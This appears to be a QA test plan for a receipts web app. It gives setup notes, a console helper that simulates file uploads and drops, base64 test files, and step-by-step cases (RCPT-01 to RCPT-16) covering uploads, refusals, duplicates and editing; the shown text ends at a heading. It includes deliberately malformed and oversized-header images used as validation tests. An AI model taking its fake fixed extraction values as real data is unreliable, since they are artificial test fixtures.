# Receipts

## Scope

The Receipts web UI under `/receipts/`: first visit, the upload page (direct-to-S3 uploads, client
and server refusals, credit charge per file), the dashboard (tabs, search, category and date
filters, sorting, pagination, URL state, CSV export), a receipt's page (preview, editing,
validation, status changes, the vendor combobox, vetting, renaming, re-running, download, trash),
the Trash, the Vendors page (tabs, search, bulk vetting, merging, deleting, the dashboard's vendor
filter), the settings page (address, accepted senders, default currency, categories), waiting for
credits and a paused (frozen) account, and access control. From RCPT-46 on, with a fresh account:
JPEG, WebP and HEIC previews, the **Take photo** input, folders dropped on the zone, cancelling
uploads, the server's own refusals (including S3 refusing a PUT whose bytes don't match the signed
checksum), files the server can't read (`unreadable`, `too_large`) and their refunds, restoring from
a receipt's page, the date presets against today, the CSV formula guard, email receipts (an HTML and
a text body in the sandboxed frame, the "needs your attention" email, the Recent emails list and its
outcomes, the Gmail forwarding confirmation; these use a **shell step**), the "storage paused" email
and in-app notification, the effect of the Receipts settings (price 0, the daily file limit), a
re-run without enough credits, phone width, dark mode and keyboard use.

Out of scope: inbound email through real SES (the shell steps feed `.eml` files to the real intake
instead), the JWT API and the CLI, rate limits (off on this server), real AI extraction, and anything
listed under "Out of scope" at the end of this file.

## Preconditions

- The test server from [`README.md`](README.md) is running at `http://localhost:8765`, freshly
  started (fresh database), with the seeded accounts. Password for all: `QaE2e-Passw0rd!`.
- Cases run **in order**; most depend on the receipts, vendors and balances earlier cases created.
  Keep a scratch list of the values marked **Record** (receipt ids, the inbox address, vendor ids).
- Know the fakes:
  - **Every file the server reads comes out the same**: vendor **Staples**, amount **42.10 USD**,
    receipt date **2026-10-09**, category **Office supplies**, type receipt, number **R-55102**,
    payment **Visa ••4242**. So every new receipt is also flagged as a *possible duplicate* of the
    oldest live Staples receipt with the same date and amount, or of one with identical bytes.
  - Processing runs **inline** during the upload's `complete` request, so a receipt is normally
    already **Processed** by the time its upload row says "Uploaded". You will rarely see
    "Received"/"Processing".
  - The receipt files live in a real S3 emulator (Floci, emptied on every server start): the
    browser PUTs each file straight to a presigned URL on the S3 host (`http://localhost:4566/…`,
    with the size and the SHA-256 checksum signed in), and previews and downloads are presigned GET
    URLs on that host. Never expect a `/receipts/…` URL to serve a file's bytes, except an email
    body (`/receipts/<id>/body/`, served by the site itself).
- Emails the site sends are delivered over SMTP and read at **`/__e2e__/mail/`** (`?to=<address>`
  filters by recipient); delivery takes a few seconds, so reload until it arrives (up to a minute).
  Links in them are absolute (`http://localhost:8765/…`); the HTML body is shown as source.
- **Shell steps** (marked "(shell step)") run a management command against the running server with
  the wrapper `python tests_e2e/ai/manage.py [--port <port>] <manage.py arguments>`, from the repo
  root (`--port` only when your server is not on 8765). It uses the server's exact environment
  (database, S3 bucket, mail). Without a shell, mark the case **BLOCKED (needs-shell)**.
- `ReceiptsSettings` defaults apply: **1 credit per file** (`price_per_file`), max file size
  **15 MB**, trash kept **30 days**, 100 files per user per 24 h (RCPT-57 changes two of them and puts
  them back).
- Sign in at `/account/login/` (fields **Email**, **Password**, button **Sign in**). Log out from the
  account menu (user icon, top right, aria-label "Account menu") > **Logout**.
- Flash messages appear as a coloured strip at the top of the page content (red for errors).

## Test data

### Files (base64)

| Name | What it is | Base64 |
|---|---|---|
| `PNG_A` | 120x160 light-gray PNG, 280 bytes | `iVBORw0KGgoAAAANSUhEUgAAAHgAAACgCAIAAABIaz/HAAAA30lEQVR42u3QMQEAAAwCIPtXtYQttgcikHIiCkSLRrRo0YgWjWjRohEtGtGiRSNaNKJFi0a0aESLFo1o0YgWLRrRohEtWjSiRSNatGhEi0a0aNGIFo1o0aIRLRrRokUjWjSiRYtGtGhEixaNaNGIFi0a0aIRLVo0okUjWrRoRItGtGjRiBaNaNGiES0a0aJFI1o0okWLRrRoRIsWjWjRiBYtGtGiES1aNKJFI1q0aESLRrRo0YgWjWjRohEtGtGiRSNaNKJFi0a0aESLFo1o0YgWLRrRohEtWjSiRSP6zwBnGZcT9CKujQAAAABJRU5ErkJggg==` |
| `PNG_B` | 120x160 dark-gray PNG, 280 bytes (different bytes from `PNG_A`) | `iVBORw0KGgoAAAANSUhEUgAAAHgAAACgCAIAAABIaz/HAAAA30lEQVR42u3QMQEAAAwCIIPZP5cttgcikHIiCkSLRrRo0YgWjWjRohEtGtGiRSNaNKJFi0a0aESLFo1o0YgWLRrRohEtWjSiRSNatGhEi0a0aNGIFo1o0aIRLRrRokUjWjSiRYtGtGhEixaNaNGIFi0a0aIRLVo0okUjWrRoRItGtGjRiBaNaNGiES0a0aJFI1o0okWLRrRoRIsWjWjRiBYtGtGiES1aNKJFI1q0aESLRrRo0YgWjWjRohEtGtGiRSNaNKJFi0a0aESLFo1o0YgWLRrRohEtWjSiRSP6zwBKir8N2jDqJAAAAABJRU5ErkJggg==` |
| `PDF_A` | One-page PDF with the text "STAPLES 42.10", 588 bytes | `JVBERi0xLjQKMSAwIG9iago8PCAvVHlwZSAvQ2F0YWxvZyAvUGFnZXMgMiAwIFIgPj4KZW5kb2JqCjIgMCBvYmoKPDwgL1R5cGUgL1BhZ2VzIC9LaWRzIFszIDAgUl0gL0NvdW50IDEgPj4KZW5kb2JqCjMgMCBvYmoKPDwgL1R5cGUgL1BhZ2UgL1BhcmVudCAyIDAgUiAvTWVkaWFCb3ggWzAgMCAyMDAgMjAwXSAvQ29udGVudHMgNCAwIFIgL1Jlc291cmNlcyA8PCAvRm9udCA8PCAvRjEgNSAwIFIgPj4gPj4gPj4KZW5kb2JqCjQgMCBvYmoKPDwgL0xlbmd0aCA0NCA+PgpzdHJlYW0KQlQgL0YxIDEyIFRmIDIwIDEwMCBUZCAoU1RBUExFUyA0Mi4xMCkgVGogRVQKZW5kc3RyZWFtCmVuZG9iago1IDAgb2JqCjw8IC9UeXBlIC9Gb250IC9TdWJ0eXBlIC9UeXBlMSAvQmFzZUZvbnQgL0hlbHZldGljYSA+PgplbmRvYmoKeHJlZgowIDYKMDAwMDAwMDAwMCA2NTUzNSBmIAowMDAwMDAwMDA5IDAwMDAwIG4gCjAwMDAwMDAwNTggMDAwMDAgbiAKMDAwMDAwMDExNSAwMDAwMCBuIAowMDAwMDAwMjQxIDAwMDAwIG4gCjAwMDAwMDAzMzUgMDAwMDAgbiAKdHJhaWxlcgo8PCAvU2l6ZSA2IC9Sb290IDEgMCBSID4+CnN0YXJ0eHJlZgo0MDUKJSVFT0YK` |
| `JPEG_A` | 80x60 blue JPEG, 708 bytes | `/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAA0JCgsKCA0LCgsODg0PEyAVExISEyccHhcgLikxMC4pLSwzOko+MzZGNywtQFdBRkxOUlNSMj5aYVpQYEpRUk//2wBDAQ4ODhMREyYVFSZPNS01T09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0//wAARCAA8AFADASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwCrRRRXunlBRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQB//Z` |
| `WEBP_A` | 80x60 green WebP, 90 bytes | `UklGRlIAAABXRUJQVlA4IEYAAADwAwCdASpQADwAPrVaqVAnJSOioagA4BaJaQDVuAT5w4cOHDhw4a4AAP7WMfxhNJOj//hWv60P7ecwO6imJXWMaEAAAAAA` |
| `HEIC_A` | 64x48 orange HEIC (an iPhone photo's format), 445 bytes | `AAAAHGZ0eXBoZWljAAAAAG1pZjFoZWljbWlhZgAAAX1tZXRhAAAAAAAAACFoZGxyAAAAAAAAAABwaWN0AAAAAAAAAAAAAAAAAAAAACJpbG9jAAAAAERAAAEAAQAAAAABoQABAAAAAAAAABwAAAAjaWluZgAAAAAAAQAAABVpbmZlAgAAAAABAABodmMxAAAAAA5waXRtAAAAAAABAAAA/WlwcnAAAADdaXBjbwAAAHZodmNDAQNwAAAAkAAAAAAAHvAA/P34+AAADwNgAAEAGEABDAH//wNwAAADAJAAAAMAAAMAHroCQGEAAQAqQgEBA3AAAAMAkAAAAwAAAwAeoCCBBZbq5Ka5uAhoMCAAAAMDIAAAAwAhYgABAAZEAcFzwIkAAAATY29scm5jbHgAAQANAAaAAAAAFGlzcGUAAAAAAAAAQAAAAEAAAAAoY2xhcAAAAEAAAAABAAAAMAAAAAEAAAAAAAAAAv////AAAAACAAAAEHBpeGkAAAAAAwgICAAAABhpcG1hAAAAAAAAAAEAAQWBAgMFhAAAACRtZGF0AAAAGCgBrxOA+BDhp3/pCj/+nXPD488vzopDPg==` |
| `BAD_PNG` | Starts with the PNG signature, then plain text: passes the type check, can't be decoded, 119 bytes | `iVBORw0KGgp0aGlzIGlzIG5vdCByZWFsbHkgYSBwbmcgaW1hZ2UgYXQgYWxsdGhpcyBpcyBub3QgcmVhbGx5IGEgcG5nIGltYWdlIGF0IGFsbHRoaXMgaXMgbm90IHJlYWxseSBhIHBuZyBpbWFnZSBhdCBhbGw=` |
| `HUGE_PNG` | A valid PNG header claiming 8000x8000 pixels (64 megapixels, over the 50-megapixel limit), 69 bytes | `iVBORw0KGgoAAAANSUhEUgAAH0AAAB9ACAIAAACJkzqjAAAADElEQVR4nGNgoD0AAABkAAGGZDw1AAAAAElFTkSuQmCC` |

You can also write these to disk (`base64 -d`) and use the browser tool's file upload instead of
the JS helper below.

### Supplying files to the upload page

The upload page (`/receipts/upload/`) has a hidden `<input type="file" id="file-input" multiple>`
behind the **Choose files** button, and a drop zone `#drop-zone`. Either:

1. use the browser tool's **file upload** action on `#file-input` (or on the file chooser opened by
   **Choose files**), or
2. paste this helper into the page's JS console once per page load, then call it. It builds `File`
   objects in the page and hands them to the real `change` handler, exactly as a file chooser
   would:

```js
window.rcptFiles = (specs) => {
  // spec: {name, type, base64} | {name, type, text} | {name, type, size} (size = that many zero bytes)
  const dt = new DataTransfer();
  for (const s of specs) {
    let bytes;
    if (s.base64 !== undefined) bytes = Uint8Array.from(atob(s.base64), (c) => c.charCodeAt(0));
    else if (s.text !== undefined) bytes = new TextEncoder().encode(s.text);
    else bytes = new Uint8Array(s.size);
    dt.items.add(new File([bytes], s.name, { type: s.type }));
  }
  return dt;
};
window.rcptPick = (specs, inputId = 'file-input') => {
  // inputId 'camera-input' feeds the input behind "Take photo" instead of "Choose files".
  const input = document.getElementById(inputId);
  input.files = rcptFiles(specs).files;
  input.dispatchEvent(new Event('change', { bubbles: true }));
};
window.rcptDrop = (specs) => {
  const dt = rcptFiles(specs);
  const zone = document.getElementById('drop-zone');
  for (const type of ['dragenter', 'dragover', 'drop']) {
    zone.dispatchEvent(new DragEvent(type, { dataTransfer: dt, bubbles: true, cancelable: true }));
  }
};
// A dropped folder, the way the browser reports one (`webkitGetAsEntry`). `tree` is
// {name: spec | subtree}: rcptDropFolder('scans', { 'a.png': {...}, inner: { 'b.png': {...} } }).
// A script can't make a real directory entry, so this stands in for one; the page walks it with the
// same code as a real drop.
window.rcptDropFolder = (folderName, tree) => {
  const fileEntry = (name, s) => ({ isFile: true, isDirectory: false, name,
    file: (resolve) => resolve(rcptFiles([{ ...s, name }]).files[0]) });
  const dirEntry = (name, t) => ({ isFile: false, isDirectory: true, name, createReader: () => {
    let done = false;
    const children = Object.entries(t).map(([n, v]) =>
      v && (v.base64 !== undefined || v.text !== undefined || v.size !== undefined) ? fileEntry(n, v) : dirEntry(n, v));
    return { readEntries: (resolve) => { resolve(done ? [] : children); done = true; } };
  } });
  const dt = { types: ['Files'], files: [], items: [{ kind: 'file', webkitGetAsEntry: () => dirEntry(folderName, tree) }] };
  const drop = new Event('drop', { bubbles: true, cancelable: true });
  Object.defineProperty(drop, 'dataTransfer', { value: dt });
  document.getElementById('drop-zone').dispatchEvent(drop);
};
// Paste the base64 strings from the table above (only the ones the case uses):
window.PNG_A = '...'; window.PNG_B = '...'; window.PDF_A = '...';
window.JPEG_A = '...'; window.WEBP_A = '...'; window.HEIC_A = '...';
window.BAD_PNG = '...'; window.HUGE_PNG = '...';
```

Example: `rcptPick([{ name: 'staples-1.png', type: 'image/png', base64: PNG_A }])`.

### Accounts and names used

| Item | Value |
|---|---|
| Main user | `qa.user@example.com` (100 credits at start) |
| Second user | `qa.broke@example.com` (0 credits) |
| Admin | `qa.admin@example.com` |
| Receipts created (main user) | `R1` = `staples-1.png` (`PNG_A`), `R2` = `staples-2.png` (`PNG_A` again), `R3` = `receipt.pdf` (`PDF_A`), `R4` = `receipt-3.png` (`PNG_B`), `F1` = `fake.pdf`, `F2` = `notes.pdf` |
| Expected main-user balance | 100 -> 99 (RCPT-05) -> 96 (RCPT-08) -> 95 (RCPT-19) -> 73 (RCPT-29) |
| Fresh account `F` (RCPT-46 on) | `qa.rcpt.<random>@example.com`, name `QA Receipts F`, password `RcptQa-4821`; 1,000 welcome credits once confirmed |
| Receipts of `F` | `J1` = `photo.jpg` (`JPEG_A`), `W1` = `scan.webp` (`WEBP_A`), `H1` = `phone.heic` (`HEIC_A`), `U1` = `broken.png` (`BAD_PNG`), `T1` = `huge.png` (`HUGE_PNG`), `A1`/`A2` = `a.png`/`b.png` (dropped folder), `C2`/`C3` = `c2.png`/`c3.png`, `E1` = the HTML email body, `E2` = the text email body, `S1` = `scan.png` (emailed), `X1` = `free.png`, `X2` = `capped.png` |
| Expected `F` balance | 1000 -> 997 (RCPT-47) -> 997 (RCPT-48, refunds) -> 993 (RCPT-49) -> 991 (RCPT-54) -> 991 (RCPT-55, refund) -> 992 (RCPT-56 top-up) -> 991 (RCPT-57: `free.png` and its re-run are free, `capped.png` costs 1) |

---

### RCPT-01 Logged out, Receipts pages send you to the login page

**Purpose:** every Receipts page requires a session and remembers where you were going.
**Preconditions:** logged out (fresh browser context).

| # | Action | Expected result |
|---|---|---|
| 1 | Go to `/receipts/`. | Redirected to `/account/login/?next=/receipts/`. The login form shows **Email**, **Password** and **Sign in**. |
| 2 | Go to `/receipts/upload/`, then `/receipts/settings/`, then `/receipts/vendors/`. | Each redirects to `/account/login/?next=<that path>`. No Receipts content is shown. |
| 3 | Go to `/receipts/upload/` again; sign in as `qa.user@example.com`. | After sign-in you land on `/receipts/upload/` (the `next` is honoured). |

### RCPT-02 First visit creates the Receipts account (dashboard empty state)

**Purpose:** the first visit sets up the account: inbox address, default categories, empty list.
**Preconditions:** logged in as `qa.user@example.com` (RCPT-01), who never opened Receipts before.

| # | Action | Expected result |
|---|---|---|
| 1 | Go to `/receipts/`. | Page title "Receipts - ZipTrigo", heading **Receipts**, buttons **Export CSV** and **Upload** top right. |
| 2 | Read the address strip under the heading. | "Email receipts to" followed by an address of the form `receipts+xxxxxxxx@ziptrigo.com` (8 lowercase letters/digits, none of `i l o 0 1`), a **Copy** button and a **Settings ->** link. **Record** it as `ADDR1`. |
| 3 | Look at the tabs row. | Tabs **All** (underlined, current), **Needs review**, **Processing**, **Failed**, **Duplicates**, none with a count badge. On the right **Vendors** (no "to vet" badge) and **Trash** (no number). |
| 4 | Look at the filters. | Search box with placeholder "Search vendor, notes or amount"; **Category** select with "All categories", "Uncategorized", then the 12 defaults in this order: Advertising & marketing, Bank & payment fees, Equipment, Meals & entertainment, Office supplies, Professional services, Rent & utilities, Software & subscriptions, Phone & internet, Travel, Vehicle & fuel, Other; **Receipt date** select with Any date, Last 15 days, Last 30 days, This month, This quarter, This year, Custom. No date inputs are visible. |
| 5 | Look at the list. | Header row: **Receipt date** (sortable), Vendor, **Added** (sortable), Category, Amount, Status. One empty-state row: "No receipts yet. Upload one, or email it to your address above." |
| 6 | Inspect the **Export CSV** link. | `href` is `/receipts/export.csv` (no query). |
| 7 | Reload the page. | Same address `ADDR1` (the account is not recreated). |

### RCPT-03 Settings page, first look

**Purpose:** the settings page shows the same address and the defaults.
**Preconditions:** RCPT-02.

| # | Action | Expected result |
|---|---|---|
| 1 | Click **Settings ->** on the dashboard. | `/receipts/settings/`, heading **Receipts settings**, a "<- Receipts" back link. |
| 2 | Read **Your receipts address**. | Shows `ADDR1`, buttons **Copy** and **Regenerate…**, help "Forward receipts here, or set an auto-forward rule in your mail app." No Gmail confirmation box. |
| 3 | Read **Accepted senders**. | **Anyone** is selected; the textarea (placeholder "me@acme.com, *@acme.com") is greyed out/disabled; help text mentions `*@acme.com`. **Default currency** select shows `USD`. A **Save** button. |
| 4 | Read **Categories**. | The 12 default categories in the order of RCPT-02 step 4, none showing a receipt count. The first row's up arrow and the last row's down arrow are disabled. A **New category** input (placeholder "Category name") and **Add** button below. |
| 5 | Read **Recent emails**. | "No emails yet." |

### RCPT-04 Upload page layout

**Purpose:** the upload page shows balance, price and limits.
**Preconditions:** RCPT-02; balance 100.

| # | Action | Expected result |
|---|---|---|
| 1 | From the dashboard click **Upload**. | `/receipts/upload/`, title "Upload receipts - ZipTrigo", heading **Upload receipts**, top right "Balance: 100 credits" (a link to `/billing/credits/`). |
| 2 | Read the drop zone. | Dashed box: cloud icon, "Drop files here, or", buttons **Choose files** and **Take photo** (both enabled), and "PDF, JPG, PNG, HEIC, WebP · up to 15 MB · 1 credit each". |
| 3 | Check what is *not* there. | No "You don't have enough credits…" notice, no "Uploads are paused…" line, no frozen banner. The upload list is empty. |
| 4 | Inspect `#camera-input` (the input behind **Take photo**). | `accept="image/*"` and `capture="environment"`. (On desktop it only opens a file chooser; do not try to use a camera.) |
| 5 | Check the **Go to receipts ->** button at the bottom. | Links to `/receipts/`. |

### RCPT-05 Upload one image: processed and charged 1 credit

**Purpose:** the happy path: browser checksum, start, direct PUT, complete, inline processing, charge.
**Preconditions:** on `/receipts/upload/`, balance 100.

| # | Action | Expected result |
|---|---|---|
| 1 | Supply one file: `rcptPick([{ name: 'staples-1.png', type: 'image/png', base64: PNG_A }])`. | A row appears with the name "staples-1.png", the size "1 KB", a progress bar (role progressbar, aria-label "Upload progress of staples-1.png") and a cancel (x) button labelled "Cancel upload of staples-1.png". The status line moves through "Preparing…" / "Uploading…" / "Finishing…" (may be too fast to see). |
| 2 | Wait for it to finish. | Status turns green: "✓ Uploaded. View receipt"; the bar is full (`aria-valuenow="100"`); the cancel button is gone. |
| 3 | Click **View receipt**. | The receipt's page `/receipts/<uuid>/` opens with heading "Staples · 2026-10-09" and a green **Processed** pill. **Record** the id as `R1_ID`. |
| 4 | Go to `/billing/credits/`. | "Current balance: 99 credits". The newest row: change "-1" (red) "Spend" pill, description "Receipt processing: staples-1.png". The seed row "+100 Purchase" "e2e seed" is below it. |
| 5 | Go to `/receipts/`. | One row: date 2026-10-09, vendor **Staples**, category Office supplies, amount "USD 42.10", pill **Processed**; second line "upload · receipt #R-55102 · Visa ••4242 · added <Mon D>". The **Vendors** link now shows an amber "1 to vet" badge. |

### RCPT-06 Files refused in the browser: wrong type, empty, too large

**Purpose:** the page refuses unsupported, empty and oversize files in their own row, without
contacting the server or charging.
**Preconditions:** on `/receipts/upload/` (reload it so the list is empty), helper pasted. Balance 99.

| # | Action | Expected result |
|---|---|---|
| 1 | `rcptPick([{ name: 'notes.txt', type: 'text/plain', text: 'not a receipt' }])`. | A row "notes.txt" shows in red "✕ Unsupported file type. Use PDF, JPG, PNG, HEIC or WebP." No progress bar, no cancel button. In the network log there is **no** request to `/receipts/upload/start/`. |
| 2 | `rcptPick([{ name: 'empty.png', type: 'image/png', size: 0 }])`. | Row "empty.png", size "0 KB", red "✕ This file is empty." No request to the server. |
| 3 | `rcptPick([{ name: 'big.pdf', type: 'application/pdf', size: 15 * 1024 * 1024 + 1 }])`. | Row "big.pdf", size "15 MB", red "✕ This file is larger than 15 MB." No request to the server. |
| 4 | Drop a file on the zone instead: `rcptDrop([{ name: 'dropped.txt', type: 'text/plain', text: 'hello' }])`. | A row "dropped.txt" with the same "Unsupported file type…" message: the drop zone feeds the same checks. |
| 5 | Go to `/receipts/` and `/billing/credits/`. | Still exactly one receipt (R1); balance still 99. |

### RCPT-07 Contents that don't match the type are rejected by the server

**Purpose:** the server sniffs magic bytes: a `.pdf` that is really a PNG, or plain text, uploads
but is refused by `complete` and kept as a failed receipt, uncharged.
**Preconditions:** on `/receipts/upload/`, helper pasted. Balance 99.

| # | Action | Expected result |
|---|---|---|
| 1 | `rcptPick([{ name: 'fake.pdf', type: 'application/pdf', base64: PNG_A }])`. | The row goes through uploading, then shows red "✕ The file's contents do not match its type." No "View receipt" link. |
| 2 | `rcptPick([{ name: 'notes.pdf', type: 'application/pdf', text: 'hello this is text' }])`. | Red "✕ This file is not a supported type. Use PDF, JPG, PNG, HEIC or WebP." |
| 3 | Go to `/receipts/`. | Two new rows **at the top** (undated rows come first in the default sort) named "notes.pdf" and "fake.pdf": date "—", category "—", amount "—", red **Failed** pill, second line "upload · This file type isn't supported. Upload a PDF, JPG, PNG, HEIC or WebP file instead. · added …". The **Failed** tab shows a count badge **2**. |
| 4 | Open "fake.pdf". **Record** its id as `F1_ID`. | Heading "fake.pdf", red **Failed** pill. Preview area: "There is no file for this receipt." No **Download original** and no **Open full size**. "Source: uploaded · fake.pdf". Right panel (instead of the form): "This file type isn't supported." and "Upload a PDF, JPG, PNG, HEIC or WebP file instead."; only a **Move to trash** button (no **Re-run extraction**). |
| 5 | Go to `/billing/credits/`. | Balance still 99; no new transaction. |

### RCPT-08 Several files at once (and duplicates flagged)

**Purpose:** multiple files upload in parallel, each charged, and look-alikes are flagged.
**Preconditions:** on `/receipts/upload/` (reload), helper pasted. Balance 99.

| # | Action | Expected result |
|---|---|---|
| 1 | `rcptPick([{ name: 'staples-2.png', type: 'image/png', base64: PNG_A }, { name: 'receipt.pdf', type: 'application/pdf', base64: PDF_A }, { name: 'receipt-3.png', type: 'image/png', base64: PNG_B }])`. | Three rows appear at once, each with its own progress bar; all three end with "✓ Uploaded. View receipt". |
| 2 | Check the header balance after reloading the page. | "Balance: 96 credits" (3 credits spent). |
| 3 | Click **Go to receipts**. | 6 rows in total. The three new ones are **Processed**, Staples, USD 42.10, 2026-10-09, and each second line carries an amber "⚠ possible duplicate" (just before "· added …"). R1's row has no such marker. The **Duplicates** tab shows **3**. |
| 4 | **Record** the ids: open each new row and note `R2_ID` (staples-2.png), `R3_ID` (receipt.pdf), `R4_ID` (receipt-3.png) from the URL ("Source: uploaded · <filename>" on the page tells which is which). | — |
| 5 | On `/billing/credits/`. | Three new "-1 Spend" rows: "Receipt processing: staples-2.png", "…: receipt.pdf", "…: receipt-3.png". Balance 96. |

### RCPT-09 Duplicates tab and "Not a duplicate"

**Purpose:** a flagged receipt shows the banner, and dismissing it clears it for good.
**Preconditions:** RCPT-08.

| # | Action | Expected result |
|---|---|---|
| 1 | On `/receipts/` click the **Duplicates** tab. | The list (swapped in place, no full reload) shows exactly R2, R3, R4. URL becomes `/receipts/?status=duplicates`; the tab is underlined. |
| 2 | Open R3 (`receipt.pdf`). | An amber banner under the heading: "**Possible duplicate** of Staples, 2026-10-09, USD 42.10" with buttons **View** and **Not a duplicate**. |
| 3 | Click **View**. | Opens R1's page (`/receipts/<R1_ID>/`). Go back. |
| 4 | Click **Not a duplicate**. | The banner disappears in place (no reload). Reloading the page: still no banner. |
| 5 | Back on `/receipts/`. | **Duplicates** badge is **2**; R3's row no longer shows "possible duplicate". |

### RCPT-10 A receipt's page: preview and fields

**Purpose:** the detail page shows the preview, source, required markers and the extracted fields.
**Preconditions:** open `/receipts/<R1_ID>/`.

| # | Action | Expected result |
|---|---|---|
| 1 | Look at the top. | "<- Receipts" link, heading "Staples · 2026-10-09", green **Processed** pill. Page title "Staples - ZipTrigo". No duplicate banner. |
| 2 | Look at the preview (left on desktop, above the form on a phone-width window). | A light-gray image with alt "Preview of Staples", actually loaded (`naturalWidth` 120). Below it **Download original** and an **Open full size** link. "Source: uploaded · staples-1.png" and "Added <Mon D, HH:MM> (receipt dated Oct 9)". |
| 3 | Look at the form. | **Vendor** \* = "Staples" with a gray "New vendor" chip inside the field and a "Rename vendor…" link above it right; below: "N receipts from this vendor so far. Fix the name if you like, then mark it vetted so future receipts are matched to it first." (N = 4) and a **Mark as vetted** button. **Receipt date** \* = 2026-10-09; **Amount** \* = 42.10 with currency select USD; **Type**: Receipt checked; **Number** R-55102; **Payment method** "Visa ••4242" with help "Only the last 4 digits are kept; longer numbers are masked."; **Category** "Office supplies"; **Notes (yours)** empty, help "Up to 5,000 characters. Only you write here; we never touch it, not even when you run the extraction again." The three required labels carry an amber `*`; no field has an amber border. |
| 4 | Look at the buttons. | **Re-run extraction (1 credit)**, red **Move to trash**, and **Save**. |
| 5 | Click **Open full size**. | Opens the image in a new tab from a presigned URL on the S3 host (not a `/receipts/` URL; its query carries an expiring signature); the image displays in the tab (it is not downloaded). Close the tab. |

### RCPT-11 Refused edits show `Label: message` and change nothing

**Purpose:** validation errors come back in the form's message slot and nothing is saved.
**Preconditions:** on `/receipts/<R1_ID>/`.

| # | Action | Expected result |
|---|---|---|
| 1 | Set **Amount** to `1.234,56`; click **Save**. | Red text above the form: "Amount: Enter the amount as a number." The typed value stays in the field; no "Saved." message; status pill unchanged. |
| 2 | Set **Amount** to `-5`; **Save**. | "Amount: The amount cannot be negative." |
| 3 | Set **Amount** to `0,500`; **Save**. | "Amount: Enter the amount as a number." (an ambiguous comma is refused). |
| 4 | (Devtools) Run `document.getElementById('id_receipt_date').type = 'text'`, type `09/10/2026` into **Receipt date**, set **Amount** to `forty`, **Save**. | Both problems in one go: "Receipt date: Enter a valid date." and "Amount: Enter the amount as a number." (dates are ISO only; a date input normally prevents this). |
| 5 | Reload the page. | Amount 42.10, date 2026-10-09: nothing was saved. |

### RCPT-12 Valid edits are saved

**Purpose:** saving normalizes values, masks card numbers and confirms with "Saved.".
**Preconditions:** on `/receipts/<R1_ID>/` (freshly loaded).

| # | Action | Expected result |
|---|---|---|
| 1 | Set **Amount** `12,50` (decimal comma), **Category** "Travel", **Number** `INV-001`, **Payment method** `Visa 4111 1111 1111 1111`, **Notes** `client lunch`; click **Save** (it shows "Saving…" briefly). | The page reloads with a "Saved." flash. |
| 2 | Check the fields. | Amount "12.50", Category "Travel", Number "INV-001", Payment method "Visa ••1111" (masked), Notes "client lunch". Pill still **Processed**. |
| 3 | Go to `/receipts/`. | R1's row: "USD 12.50", category Travel, second line "… receipt #INV-001 · Visa ••1111 …". |

### RCPT-13 Clearing a required field moves the receipt to Needs review, and back

**Purpose:** `processed` <-> `needs_review` follows the required fields.
**Preconditions:** on `/receipts/<R1_ID>/`.

| # | Action | Expected result |
|---|---|---|
| 1 | Clear **Receipt date** (empty the date input); **Save**. | "Saved." The pill is now amber **Needs review**; the heading is just "Staples" (no date). The date field has an amber border and the hint "We couldn't read the date. Check the receipt and fill it in." |
| 2 | Go to `/receipts/`. | **Needs review** tab has an amber badge **1**. R1's row shows date "—", the amber pill, and "· date missing" in the second line. Click **Needs review**: only R1 is listed. |
| 3 | Back on R1, set **Receipt date** to `2025-06-30`; **Save**. | "Saved."; pill **Processed**; heading "Staples · 2025-06-30"; no amber border or hint. |
| 4 | On `/receipts/`. | Needs review has no badge. R1 now sorts **below** the 2026-10-09 receipts (newest receipt date first). |

### RCPT-14 Vendor combobox: suggestions, keyboard, teaching hint

**Purpose:** the vendor field suggests the user's vendors and explains what a change will teach.
**Preconditions:** on `/receipts/<R1_ID>/`; Staples is still **not** vetted.

| # | Action | Expected result |
|---|---|---|
| 1 | Click into **Vendor**, select all, type `Sta`. | A listbox labelled "Your vendors" opens under the field: a "NOT VETTED YET" group with "**Sta**ples" and "4 receipts" (the typed part in bold), and an entry "Use “Sta” as a new vendor". The chip inside the field now reads **Vetted** (what the typed name will become on save). |
| 2 | Press ArrowDown twice. | The highlight moves to the second option ("Use “Sta” as a new vendor"); the input's `aria-activedescendant` is `vendor-option-new`. |
| 3 | Press Escape. | The list closes; the text "Sta" stays; the form is **not** submitted. |
| 4 | Replace the text with `Office Depot`. | The "Rename vendor…" link and the "Mark as vetted" box are hidden while the field is changed. A blue hint appears: "On save, future receipts read as **“Staples”** will be filed under **Office Depot**. Receipts you already have stay as they are." |
| 5 | Type `Staples` back exactly, then reload the page **without saving**. | Field back to "Staples" with the "New vendor" chip; nothing changed. |

### RCPT-15 Mark as vetted

**Purpose:** vetting a vendor from the receipt page re-renders the field in place.
**Preconditions:** on `/receipts/<R1_ID>/`.

| # | Action | Expected result |
|---|---|---|
| 1 | Click **Mark as vetted**. | The vendor field updates in place (no page reload): green **Vetted** chip, the "Mark as vetted" box is gone. |
| 2 | Go to `/receipts/`. | The **Vendors** link no longer shows "to vet". |
| 3 | Back on R1, replace the vendor text with `Office Depot` (do not save). | **No** blue teaching hint this time: a vetted vendor keeps its own name, so nothing would be taught. Reload without saving. |

### RCPT-16 A differently spelled name files the receipt under the existing vendor

